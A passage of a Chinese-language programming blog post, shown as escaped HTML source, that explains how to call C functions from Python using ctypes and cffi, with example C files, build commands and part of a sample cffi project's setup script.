&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3 test.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-&amp;gt;设置符合C标准的返回值类型-&amp;gt;调用，肥肠的简单&lt;/p>
&lt;p>不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库&lt;/p>
&lt;h4 id="cffi库">cffi库&lt;/h4>
&lt;p>这里是一个hello world的小demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 可以定义函数 结构体 变量&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 加载c命名空间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 即 char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后调用&lt;code>ffi.verify()&lt;/code>在Python中加载和使用，不过还需要额外声明函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
&lt;p>以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 需要的头文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python build_cffi.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 直接调用c函数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python test.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可&lt;/p>
&lt;p>或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>来演示（&lt;del>就不复制粘贴了捏&lt;/del> 就粘就粘&lt;/p>
&lt;p>首先是一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>这是&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>，用于生成模块在fnmatch.py中使用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># }&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
